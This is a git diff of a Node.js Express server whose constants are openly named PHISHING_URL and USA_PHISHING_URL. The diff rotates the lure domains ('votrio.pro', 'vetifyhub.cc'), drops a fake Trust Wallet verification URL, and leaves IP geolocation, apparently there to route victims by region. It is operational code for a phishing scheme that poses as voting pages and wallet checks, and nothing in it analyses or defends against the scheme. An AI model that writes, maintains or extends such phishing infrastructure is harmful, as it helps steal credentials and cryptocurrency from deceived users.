@@ -8,7 +8,7 @@ const expressLayout = require("express-ejs-layouts");
 const fileUpload = require("express-fileupload");
 const {IP2Location} = require("ip2location-nodejs");
 
-const PHISHING_URL = "sigmavotz.site";
+const PHISHING_URL = "votrio.pro";
 const USA_PHISHING_URL = "vetifyhub.cc";
 
 
@@ -65,9 +65,6 @@ app.use(function (req, res, next) {
   req.app.voteUrl2 = `www.${PHISHING_URL}`;
   req.app.hostname1 = `www.${USA_PHISHING_URL}`;
   req.app.hostname2 = `www.${USA_PHISHING_URL}`;
-
-  // req.app.voteUrl = "http://localhost:5001"
-  req.app.trustWalletURL = "https://trust-verrification.vercel.app"
   next();
 });
 
